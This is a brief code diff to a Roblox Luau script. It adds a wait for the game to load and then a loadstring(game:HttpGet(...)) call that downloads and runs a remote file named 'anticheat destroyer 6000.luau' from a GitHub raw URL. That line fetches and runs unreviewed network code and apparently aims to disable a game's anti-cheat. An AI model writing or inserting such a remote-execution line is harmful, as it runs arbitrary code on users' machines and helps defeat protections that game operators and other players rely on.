@@ -1,3 +1,8 @@
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bananalyze/bAC-bananalyze-AntiCheat/refs/heads/main/anticheat%20destroyer%206000.luau"))()
 do
     local Players = game:GetService("Players")
     local RunService = game:GetService("RunService")
